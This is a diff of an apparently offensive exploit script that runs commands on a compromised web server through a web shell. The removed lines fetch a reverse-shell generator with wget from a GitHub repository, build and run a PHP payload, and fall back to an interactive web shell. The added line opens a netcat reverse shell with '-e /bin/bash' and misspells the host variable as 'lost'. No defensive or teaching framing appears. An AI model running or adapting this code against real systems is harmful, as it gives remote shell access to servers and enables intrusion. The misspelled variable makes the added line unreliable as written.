@@ -77,38 +77,7 @@ now = datetime.now()
 time_display = now.strftime("%d/%m/%Y %H:%M:%S")
 
 # open the shell
-print(f'\n[+] Web shell opened at {time_display}\n[+] Injecting payload generator...')
+print(f'\n[+] Web shell opened at {time_display}\n[+] Trying to open the reverse shell on {lhost}:{lport}...')
 
-inject('rm /tmp/revgen.py')
-inject('wget -O /tmp/revgen.py https://raw.githubusercontent.com/evilcater/H4cX/master/Tools/auto_reverse_shell/autorev.py')
-
-if response(inject('file /tmp/revgen.py')) == '/tmp/revgen.py: ASCII text, with very long lines':
-	print('[+] Payload generator injected')
-else:
-	print("[-] Unable to inject payload generator, maybe /tmp is not writtable. Do you want to open a webshell ? (limited functionalites) y/n")
-	ask = input('>')
-	if ask == 'n': exit()
-	while True:
-		user_data = input(f'{response(inject("whoami"))}${response(inject("pwd"))} - ')
-		if user_data == 'exit': exit()
-		print(response(inject(user_data)))
-    
-inject('rm /tmp/realexploit.php')
-inject(f'python3 /tmp/revgen.py {lhost} {lport} realexploit.php')
-
-if response(inject('file /tmp/realexploit.php')) == '/tmp/realexploit.php: PHP script, ASCII text, with very long lines':
-	print('[+] Payload created !')
-else:
-	print("[-] Unable to create payload,maybe the server does not run python3. Do you want to open a webshell ? (limited functionalites) y/n")
-	ask = input('>')
-	if ask == 'n': exit()
-	while True:
-		user_data = input(f'{response(inject("whoami"))}${response(inject("pwd"))} - ')
-		if user_data == 'exit': exit()
-		print(response(inject(user_data)))
-
-
-print('[+] Launching the script : php -f /tmp/realexploit.php... (Please check your netcat window)')
-
-inject('php -f /tmp/realexploit.php')
+inject(f'nc.traditional {lost} {lport} -e /bin/bash') 
 
